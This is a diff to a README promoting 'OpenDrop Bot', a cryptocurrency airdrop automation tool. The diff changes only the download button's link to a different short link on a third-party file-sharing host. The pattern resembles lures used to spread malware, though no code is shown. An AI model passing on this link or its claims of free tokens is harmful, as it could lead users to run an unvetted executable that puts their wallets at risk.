@@ -2,7 +2,7 @@
 
 OpenDrop Bot is a cryptocurrency automation tool designed to simplify and streamline the process of participating in airdrops. It helps users claim free tokens from various blockchain projects by automating the necessary tasks, such as joining social media channels, following accounts, and completing other requirements for airdrop eligibility. By using the OpenDrop Bot, users can save significant time and effort, ensuring they don't miss out on valuable token giveaways.
 
-[![Download OpenDrop bot](https://img.shields.io/badge/Download-OpenDrop%20Bot-blueviolet)](https://downeefiles.com/s/opdr)
+[![Download OpenDrop bot](https://img.shields.io/badge/Download-OpenDrop%20Bot-blueviolet)](https://downeefiles.com/s/opndr)
 
 ### Key Features:
 - **Automated Airdrop Participation**:  
